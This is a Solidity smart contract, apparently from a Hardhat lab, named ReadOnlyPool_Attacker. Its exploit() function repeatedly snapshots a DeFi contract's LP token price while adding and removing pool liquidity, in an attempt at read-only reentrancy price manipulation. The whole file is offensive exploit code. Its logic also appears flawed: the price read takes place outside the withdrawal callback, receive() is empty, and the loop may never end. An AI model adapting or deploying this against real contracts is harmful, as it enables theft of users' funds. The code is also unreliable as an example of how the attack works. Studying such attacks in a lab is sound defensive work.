//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "hardhat/console.sol";

interface IReadOnlyPool {
    function addLiquidity() external payable;
    function removeLiquidity() external;
    function getVirtualPrice() external view returns (uint256);
}

interface IVulnerableDeFiContract {
    function lpTokenPrice() external view returns (uint256);
    function snapshotPrice() external;
}

contract ReadOnlyPool_Attacker {
    IReadOnlyPool public pool;
    IVulnerableDeFiContract public deFiContract;

    constructor(address _pool, address _deFiContract) {
        pool = IReadOnlyPool(_pool);
        deFiContract = IVulnerableDeFiContract(_deFiContract);
    }

    function exploit() public {
        while (deFiContract.lpTokenPrice() > 0) {
            deFiContract.snapshotPrice();
            uint256 balance = address(this).balance;
            pool.addLiquidity{value: balance}();
            pool.removeLiquidity();
        }
    }

    receive() external payable {}
    fallback() external payable {}
}
